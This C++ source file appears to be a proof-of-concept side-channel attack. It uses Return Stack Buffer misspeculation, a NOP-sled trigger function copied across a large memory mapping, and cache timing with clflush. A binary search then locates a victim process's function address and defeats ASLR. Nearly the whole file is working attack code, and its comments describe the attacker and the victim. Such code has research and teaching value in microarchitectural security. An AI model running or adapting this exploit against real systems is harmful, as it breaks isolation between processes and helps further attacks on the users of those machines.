#include "util.hpp"
#include <iostream>
#include <fstream>
#define magicNumber 123*256
#define maxCopyLength 128
#define iterations 10000
#define maxCacheHitTime 100
#define useFirstMmap 1

using namespace std;

// Special memory location is inside a large unused array to ensure it
// is not prematurely loaded into memory.
char array[256*256];
void *loadMemoryPtr;

// Assembly instructions for return loop.
// 1. Call the get_rip label to push instruction pointer onto the stack
// 2. Pop IP off the stack
// 3. Add offset to IP
// 4. Push modified IP onto the stack pointing to start of the next loop
// 5. Flush the stack from the cache to extend speculation window
// 6. Run cpuid to ensure flush completes before returning
// 7. Return to next instruction
#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $13,%0;" "push %0;" "clflush (%%rsp);" "cpuid;" "ret;"

int checkForMisspeculation() {
	ADDR_PTR tmp;
	int total = 0;

	// Run 'return' instructions in a loop to consume entries off the RSB. 
	// This causes speculative execution at the same virtual address as
	// the victim's return address.
	for (int i = 0; i < iterations; i++) {
		sched_yield();
		asm(
			retAsm( 1)
			retAsm( 2)
			retAsm( 3)
			retAsm( 4)
			retAsm( 5)
			retAsm( 6)
			retAsm( 7)
			retAsm( 8)
			retAsm( 9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			: 
		);
	
		// Afterwards, check whether the misspeculation occured in our chosen
		// memory region. Measure load time of the known location. If time is
		// low, it was speculatively loaded into the cache. If time is high,
		// it was not speculatively loaded. Low times are approx. 80 cycles,
		// high times are approx. 200 cycles.
		total += measure_one_block_access_time((ADDR_PTR)&array[magicNumber]);
		clflush((void *)&array[magicNumber]);
	}

	return total/iterations;
}

// Access a memory location known to the attacker. This function is never
// explicitly called, but is run speculatively based on the victim's memory layout.
// The beginning 115 NOPs give the attacker some leeway - speculative execution will
// slide down the NOPs and reach the memory access.
void loadMemory() {
	asm(
		".rept 115;"
		"nop;"
		".endr;"
		"mov $0x55555575db40, %%rax;"
		"mov (%%rax),%%rax;"
		: : : "rax"
	);
}

// Calculate address of the end of an mmap.
void* getEndAddr(void *startAddr) {
	return (void *)((ADDR_PTR)startAddr + (largeMapSize));
}

// Calculate the access time for an address range. Copy the trigger function (loadMemory) into
// many points in the address range, and return the memory access time. 
int doSearch(ADDR_PTR low, ADDR_PTR high) {
	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;
	int copyLength = maxCopyLength;

	// If the range is shorter than the NOOP slide, shorten the slide.
	while (copyLength > difference) {
		copyLength /= 2;
	}

	// Copy the trigger function into the range.
	for (ADDR_PTR i = low; i < high; i += copyLength) {
		memcpy(
			(void *)i,
			(void *)((ADDR_PTR)loadMemoryPtr+maxCopyLength-copyLength),
			copyLength);
	}

	int result = checkForMisspeculation();
	// printf("low: %p, high: %p, diff: %lu time:%i\n", low, high, difference, result);

	// Zero the memory to prepare for the next check.
	memset((void *)low, 0, difference);

	return result;
}

// Given a range of virtual addresses, perform a recursive search to determine
// which address is being speculatively accessed.
ADDR_PTR search(ADDR_PTR low, ADDR_PTR high) {
	printf("Victim function between %p and %p.\n", (void *)low, (void *)high);
	ADDR_PTR midpoint = (low + high) / 2;
	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;

	// When we've narrowed it down to a 64 byte range, print the results. This is our answer!
	if (difference <= 64) {
		// printf("Victim function is between virtual addresses %p and %p.\n", (void *)low, (void *)high);
		return doSearch(low, high);
	}

	// Avoid measurement noise. Repeat measurments until
	//   * the two measurements are more than 50 cycles apart, and
	//   * at least one measurement is below 100 cycles
	int timeLow = maxCacheHitTime, timeHigh = maxCacheHitTime, timeDiff = 0;
	while(timeDiff < 50 && ~(timeLow < maxCacheHitTime || timeHigh < maxCacheHitTime)) {
		timeLow = doSearch(low, midpoint);
		timeHigh = doSearch(midpoint, high);
		timeDiff = abs(timeLow - timeHigh);
	}

	if (timeLow < timeHigh) {
		return search(low, midpoint);
	} else {
		return search(midpoint, high);
	}
}

void lastFunction();

int main(int argc, char *argv[]){
	void *startAddr, *endAddr;

	// Address of memory load instructions which will be speculatively accessed.
	// Memory load occurs 4 bytes after the function pointer.
	loadMemoryPtr = (void *)((ADDR_PTR)&loadMemory+4);

	// This starting address should be modified to match the first few bits of the victim's address.
	startAddr = (void *)0x564020000000;
	endAddr = getEndAddr(startAddr);
	largeMap(startAddr);

	// Use a binary search to find the specific alignment.
	search(ADDR_PTR(startAddr), ADDR_PTR(endAddr));

	return 0;
}

void lastFunction() {
	// End of code segment. Since Attacker doesn't use ASLR, this function is located close to 
	// virtual address 0. Fill lots of memory after this point.
}